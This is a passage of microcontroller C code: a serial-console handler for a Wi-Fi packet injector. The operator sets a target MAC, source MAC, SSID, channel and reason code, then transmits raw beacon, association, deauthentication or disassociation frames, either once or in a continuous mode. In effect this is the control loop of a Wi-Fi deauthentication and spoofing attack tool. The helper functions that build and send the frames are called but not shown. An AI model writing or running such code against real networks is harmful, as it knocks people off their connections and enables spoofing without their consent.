          Serial.println("Manual transmission triggered");
          if (!check_hardware_ready()) {
            Serial.println("Hardware busy, please wait");
            break;
          }
          uint16_t packet_size = 0;
          uint8_t* tx_buf = packet_buffer;
          switch (selected_frame) {
            case FRAME_ASSOC_REQ:
              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
              tx_buf = packet_buffer;
              break;
            case FRAME_BEACON:
              packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, wifi_channel);
              tx_buf = beacon_buffer;
              break;
            case FRAME_DEAUTH:
              packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = deauth_buffer;
              break;
            case FRAME_DISASSOC:
              packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = disassoc_buffer;
              break;
            default:
              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
              tx_buf = packet_buffer;
              break;
          }
          bool tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);
          Serial.printf("Transmission %s\n", tx_result ? "successful" : "failed");
          if (debug_mode) print_packet_details(tx_buf, packet_size);
        }
        break;

      case 'c': // Toggle continuous mode
        continuous_mode = !continuous_mode;
        Serial.printf("Continuous mode: %s\n", continuous_mode ? "ON" : "OFF");
        break;

      case 'd': // Toggle debug mode
        debug_mode = !debug_mode;
        Serial.printf("Debug mode: %s\n", debug_mode ? "ON" : "OFF");
        break;

      case 'h': // Show help
        Serial.println("\nAvailable Commands:");
        Serial.println("t - Trigger single transmission");
        Serial.println("c - Toggle continuous mode");
        Serial.println("d - Toggle debug mode");
        Serial.println("h - Show this help");
        Serial.println("s - Show current status");
        Serial.println("1-9 - Set channel (1-9)");
        Serial.println("m - Set custom MAC address");
        Serial.println("f - Select frame type");
        Serial.println("n - Set SSID");
        Serial.println("r - Set reason code (deauth/disassoc)");
        break;

      case 's': // Show status
        Serial.println("\n=== Current Status ===");
        Serial.printf("Continuous Mode: %s\n", continuous_mode ? "ON" : "OFF");
        Serial.printf("Debug Mode: %s\n", debug_mode ? "ON" : "OFF");
        Serial.printf("Current Channel: %d\n", wifi_channel);
        Serial.printf("Target MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     target_mac[0], target_mac[1], target_mac[2],
                     target_mac[3], target_mac[4], target_mac[5]);
        Serial.printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     source_mac[0], source_mac[1], source_mac[2],
                     source_mac[3], source_mac[4], source_mac[5]);
        Serial.printf("SSID: %s\n", ssid);
        Serial.printf("Frame Type: %d\n", selected_frame);
        Serial.printf("Reason Code: 0x%04X\n", reason_code);
        Serial.println("===================");
        break;

      case 'm': // Set custom MAC
        if (Serial.available() >= 17) { // Wait for complete MAC (XX:XX:XX:XX:XX:XX)
          char mac_str[18];
          Serial.readBytes(mac_str, 17);
          mac_str[17] = '\0';
          if (parse_mac_address(mac_str, target_mac)) {
            Serial.println("MAC address updated successfully");
          } else {
            Serial.println("Invalid MAC address format");
          }
        }
        break;      case 'f': // Select frame type
        select_frame_type();
        break;

      case 'n': // Set SSID
        Serial.println("Enter new SSID (max 32 chars):");
        while (!Serial.available());
        {
          int len = Serial.readBytesUntil('\n', ssid, 32);
          ssid[len] = '\0';
          Serial.printf("SSID set to: %s\n", ssid);
        }
        break;

      case 'r': // Set reason code
        Serial.println("Enter reason code (hex, e.g. 0001):");
        while (!Serial.available());
        {
          char reason_str[5] = {0};
          int len = Serial.readBytes(reason_str, 4);
          reason_str[4] = '\0';
          unsigned int val = 0;
          sscanf(reason_str, "%x", &val);
          reason_code = (uint16_t)val;
          Serial.printf("Reason code set to: 0x%04X\n", reason_code);
        }
        break;

      default:
        if (cmd >= '1' && cmd <= '9') {
          wifi_channel = cmd - '0';
          Serial.printf("Channel set to %d\n", wifi_channel);
        }
        break;
    }
  }
    // Handle serial buffer and yield CPU
  yield();
}